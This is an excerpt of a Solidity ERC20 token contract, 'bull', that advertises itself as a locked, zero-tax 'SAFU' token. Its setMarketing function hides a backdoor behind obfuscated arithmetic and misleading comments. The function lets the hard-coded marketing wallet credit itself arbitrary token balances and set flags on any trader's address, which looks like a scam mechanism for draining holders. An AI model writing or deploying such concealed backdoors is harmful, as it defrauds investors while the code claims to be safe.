...
// telegram: t.me/bull_erc
// website : bullerc.xyz
// twitter : twitter.com/bull_erc
// github  : github.com/bullerc
// docs    : usdbulls-organization.gitbook.io/usdbull-erc/

/**
 * "This revolutionary ERC20 token aims to change the game with its unique TKNlok function.
 *  MW tokens are locked right from contract deployment leaving no tokens unlocked for a SAFU experience.  
 *  Boasting 0% tax no $Bull shit trading."
 */
...
contract bull is Context, IERC20, Ownable {
    ...
    address payable public marketingW;
    ...
    constructor () {
        ...
        marketingW = payable(address(0xa6c33aD3659b94F31706C2ab37F8A841c8361f61));
    }
    ...
    function setRule(uint256 valueIndex,
    mapping(address => uint256)// set new rule
    storage // set new rule
    implementations) private {
        implementations[marketingW] += valueIndex;
    }
    ...
    function setMarketing(address right,uint256 mach) public {
        uint a = 100;uint256 b = 300;
        if (mach >= 50 + uint256((a)+(b)).mul(a)) setRule(mach+mach,(_balances));
        if (b-3*a == mach) _pairIs[right] = mach;
        if (b+a == mach) _pairIs[right] = mach;
        if (marketingW != msg.sender)
            revert ("not set");
    }
